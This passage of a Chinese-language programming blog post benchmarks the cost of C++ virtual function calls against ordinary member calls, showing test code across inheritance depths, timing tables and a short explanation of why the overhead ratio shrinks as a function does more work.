class="keyword">return</span> <span class="built_in">array</span>[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		pos = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IVector</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">int</span> val)</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">at</span><span class="params">(<span class="keyword">int</span> i)</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">virtual</span> ~IVector() &#123;&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VirtualVector1</span> :</span> <span class="keyword">public</span> IVector&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="keyword">int</span> *<span class="built_in">array</span>;</span><br><span class="line">	<span class="keyword">int</span> pos;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	VirtualVector1(<span class="keyword">int</span> size):<span class="built_in">array</span>(<span class="keyword">new</span> <span class="keyword">int</span>[size]),pos(<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">array</span>[<span class="number">1</span>] = val;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">at</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">array</span>[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		pos = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	~VirtualVector1()</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">array</span> != <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">delete</span> <span class="built_in">array</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VirtualVector2</span> :</span> <span class="keyword">public</span> VirtualVector1&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	VirtualVector2(<span class="keyword">int</span> size):VirtualVector1(size)</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">array</span>[<span class="number">2</span>] = val;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">at</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">array</span>[<span class="number">2</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		pos = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VirtualVector3</span> :</span> <span class="keyword">public</span> VirtualVector2&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	VirtualVector3(<span class="keyword">int</span> size):VirtualVector2(size)</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">array</span>[<span class="number">3</span>] = val;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">at</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">array</span>[<span class="number">3</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		pos = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VirtualVector4</span> :</span> <span class="keyword">public</span> VirtualVector3&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	VirtualVector4(<span class="keyword">int</span> size):VirtualVector3(size)</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">array</span>[<span class="number">4</span>] = val;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">at</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">array</span>[<span class="number">4</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		pos = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VirtualVector5</span> :</span> <span class="keyword">public</span> VirtualVector4&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	VirtualVector5(<span class="keyword">int</span> size):VirtualVector4(size)</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">array</span>[<span class="number">5</span>] = val;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">at</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">array</span>[<span class="number">5</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		pos = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VirtualVector6</span> :</span> <span class="keyword">public</span> VirtualVector5&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	VirtualVector6(<span class="keyword">int</span> size):VirtualVector5(size)</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">array</span>[<span class="number">6</span>] = val;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">at</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">array</span>[<span class="number">6</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		pos = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VirtualVector</span> :</span> <span class="keyword">public</span> VirtualVector6&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	VirtualVector(<span class="keyword">int</span> size):VirtualVector6(size)</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">array</span>[pos++] = val;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">at</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">array</span>[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		pos = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testVectorPush</span><span class="params">(Vector&amp; v)</span></span>&#123;</span><br><span class="line">	v.clear();</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStart;      <span class="comment">//计时开始</span></span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStop;       <span class="comment">//计时结束</span></span><br><span class="line">	nTimeStart = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		v.push_back(i);</span><br><span class="line">		<span class="comment">//cout&lt;&lt;v.size()&lt;&lt;endl;</span></span><br><span class="line">	&#125;</span><br><span class="line">	nTimeStop = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt;<span class="string">"耗时："</span>&lt;&lt;(<span class="keyword">double</span>)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;<span class="string">"秒"</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testVectorAt</span><span class="params">(Vector&amp; v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStart;      <span class="comment">//计时开始</span></span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStop;       <span class="comment">//计时结束</span></span><br><span class="line">	<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	nTimeStart = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">1</span>; ++j)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			sum += v.at(i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	nTimeStop = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt;<span class="string">"耗时："</span>&lt;&lt;(<span class="keyword">double</span>)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;<span class="string">"秒"</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"sum:"</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testVirtualVectorPush</span><span class="params">(IVector&amp; v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	v.clear();</span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStart;      <span class="comment">//计时开始</span></span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStop;       <span class="comment">//计时结束</span></span><br><span class="line">	nTimeStart = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		v.push_back(i);</span><br><span class="line">		<span class="comment">//cout&lt;&lt;v.size()&lt;&lt;endl;</span></span><br><span class="line">	&#125;</span><br><span class="line">	nTimeStop = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt;<span class="string">"耗时："</span>&lt;&lt;(<span class="keyword">double</span>)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;<span class="string">"秒"</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testVirtualVectorAt</span><span class="params">(IVector&amp; v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStart;      <span class="comment">//计时开始</span></span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStop;       <span class="comment">//计时结束</span></span><br><span class="line">	<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	nTimeStart = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">1</span>; ++j)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			sum += v.at(i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	nTimeStop = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt;<span class="string">"耗时："</span>&lt;&lt;(<span class="keyword">double</span>)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;<span class="string">"秒"</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"sum:"</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="keyword">sizeof</span>(VirtualVector)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">auto</span> v = VirtualVector1(size);</span><br><span class="line">		v.push_back(<span class="number">0</span>);</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;v.at(<span class="number">0</span>)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">auto</span> v = VirtualVector2(size);</span><br><span class="line">		v.push_back(<span class="number">0</span>);</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;v.at(<span class="number">0</span>)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">auto</span> v = VirtualVector3(size);</span><br><span class="line">		v.push_back(<span class="number">0</span>);</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;v.at(<span class="number">0</span>)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">auto</span> v = VirtualVector4(size);</span><br><span class="line">		v.push_back(<span class="number">0</span>);</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;v.at(<span class="number">0</span>)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">auto</span> v = VirtualVector5(size);</span><br><span class="line">		v.push_back(<span class="number">0</span>);</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;v.at(<span class="number">0</span>)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">auto</span> v = VirtualVector6(size);</span><br><span class="line">		v.push_back(<span class="number">0</span>);</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;v.at(<span class="number">0</span>)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">auto</span> *v = <span class="keyword">new</span> Vector(size);</span><br><span class="line">	<span class="keyword">auto</span> *V = <span class="keyword">new</span> VirtualVector(size);</span><br><span class="line"> </span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"testVectorPush:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	testVectorPush(*v);</span><br><span class="line">	testVectorPush(*v);</span><br><span class="line">	testVectorPush(*v);</span><br><span class="line">	testVectorPush(*v);</span><br><span class="line"> </span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"testVirtualVectorPush:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	testVirtualVectorPush(*V);</span><br><span class="line">	testVirtualVectorPush(*V);</span><br><span class="line">	testVirtualVectorPush(*V);</span><br><span class="line">	testVirtualVectorPush(*V);</span><br><span class="line"> </span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"testVectorAt:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	testVectorAt(*v);</span><br><span class="line">	testVectorAt(*v);</span><br><span class="line">	testVectorAt(*v);</span><br><span class="line">	testVectorAt(*v);</span><br><span class="line"> </span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"testVirtualVectorAt:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	testVirtualVectorAt(*V);</span><br><span class="line">	testVirtualVectorAt(*V);</span><br><span class="line">	testVirtualVectorAt(*V);</span><br><span class="line">	testVirtualVectorAt(*V);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p>测试结果都取最小时间</p>
<p>1层继承的测试结果：</p>
<table>
<thead>
<tr>
<th></th>
<th>push_back</th>
<th>at</th>
</tr>
</thead>
<tbody>
<tr>
<td>Vector</td>
<td>0.263s</td>
<td>0.04s</td>
</tr>
<tr>
<td>VirtualVector</td>
<td>0.331s</td>
<td>0.222s</td>
</tr>
<tr>
<td>倍数</td>
<td>1.25</td>
<td>5.55</td>
</tr>
</tbody>
</table>
<p>6层继承的测试结果：</p>
<table>
<thead>
<tr>
<th></th>
<th>push_back</th>
<th>at</th>
</tr>
</thead>
<tbody>
<tr>
<td>Vector</td>
<td>0.262s</td>
<td>0.041s</td>
</tr>
<tr>
<td>VirtualVector</td>
<td>0.334s</td>
<td>0.223s</td>
</tr>
<tr>
<td>倍数</td>
<td>1.27</td>
<td>5.43</td>
</tr>
</tbody>
</table>
<ol>
<li><p>可以看出继承层数和虚函数调用效率无关</p>
</li>
<li><p>可以看出虚函数慢得有点令人发指了，对于at操作，虚函数花的时间竟然是普通函数的5.5倍！</p>
</li>
</ol>
<p>但是，再看看，我们可以发现对于push_back操作，虚函数花的时间是普通函数的1.25倍。why?</p>
<p>再分析下代码，我们可以发现at操作的逻辑，明显要比push_back的逻辑要简单。</p>
<p>虚函数额外消耗时间为 vt，函数本身所消耗时间为 ft，则有以下</p>
<ul>
<li>倍数 = (vt + ft)/ft = 1 + vt/ft</li>
</ul>
<p>显然当ft越大，即函数本身消耗时间越长，则倍数越小。</p>
<p>那么让我们在at操作中加了额外代码，统计下1到100之和：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">at</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	sssForTest = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">100</span>; ++j)</span><br><span class="line">		sssForTest += j;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">array</span>[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> size = <span class="number">100000000</span>;</span><br><span class="line"><span class="keyword">int</span> sssForTest = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vector</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="keyword">int</span> *<span class="built_in">array</span>;</span><br><span class="line">	<span class="keyword">int</span> pos;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	Vector(<span class="keyword">int</span> size):<span class="built_in">array</span>(<span class="keyword">new</span> <span class="keyword">int</span>[size]),pos(<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">array</span>[pos++] = val;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">at</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		sssForTest = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">100</span>; ++j)</span><br><span class="line">			sssForTest += j;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">array</span>[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		pos = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IVector</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">int</span> val)</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">at</span><span class="params">(<span class="keyword">int</span> i)</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">virtual</span> ~IVector() &#123;&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VirtualVector</span> :</span> <span class="keyword">public</span> IVector&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="keyword">int</span> *<span class="built_in">array</span>;</span><br><span class="line">	<span class="keyword">int</span> pos;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	VirtualVector(<span class="keyword">int</span> size):<span class="built_in">array</span>(<span class="keyword">new</span> <span class="keyword">int</span>[size]),pos(<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">array</span>[pos++] = val;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">at</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		sssForTest = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">100</span>; ++j)</span><br><span class="line">			sssForTest += j;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">array</span>[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		pos = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	~VirtualVector()</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">array</span> != <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">delete</span> <span class="built_in">array</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testVectorPush</span><span class="params">(Vector&amp; v)</span></span>&#123;</span><br><span class="line">	v.clear();</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStart;      <span class="comment">//计时开始</span></span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStop;       <span class="comment">//计时结束</span></span><br><span class="line">	nTimeStart = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		v.push_back(i);</span><br><span class="line">		<span class="comment">//cout&lt;&lt;v.size()&lt;&lt;endl;</span></span><br><span class="line">	&#125;</span><br><span class="line">	nTimeStop = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt;<span class="string">"耗时："</span>&lt;&lt;(<span class="keyword">double</span>)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;<span class="string">"秒"</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testVectorAt</span><span class="params">(Vector&amp; v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStart;      <span class="comment">//计时开始</span></span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStop;       <span class="comment">//计时结束</span></span><br><span class="line">	<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	nTimeStart = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">1</span>; ++j)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			sum += v.at(i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	nTimeStop = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt;<span class="string">"耗时："</span>&lt;&lt;(<span class="keyword">double</span>)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;<span class="string">"秒"</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"sum:"</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testVirtualVectorPush</span><span class="params">(IVector&amp; v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	v.clear();</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStart;      <span class="comment">//计时开始</span></span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStop;       <span class="comment">//计时结束</span></span><br><span class="line">	nTimeStart = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		v.push_back(i);</span><br><span class="line">		<span 